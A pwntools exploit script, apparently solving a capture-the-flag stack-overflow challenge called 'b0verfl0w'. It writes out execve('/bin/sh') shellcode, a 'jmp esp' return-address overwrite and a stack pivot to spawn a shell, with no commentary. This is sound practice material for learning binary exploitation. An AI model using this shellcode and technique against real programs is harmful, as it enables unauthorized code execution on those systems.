#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
context(log_level = "debug", terminal = ["deepin-terminal", "-x", "sh", "-c"], arch = "i386", os = "linux")

def debug(addr = 0x080485A0):
    raw_input("debug:")
    gdb.attach(io, "b *" + str(addr))

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
shellcode += "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
jmp_esp = 0x08048504

payload = shellcode.ljust(0x20 + 0x4)
payload += p32(jmp_esp)
payload += asm("sub esp, 0x28; jmp esp")

io = process("./b0verfl0w")
#  debug()
io.sendlineafter("your name?\n", payload)

io.interactive()
io.close()

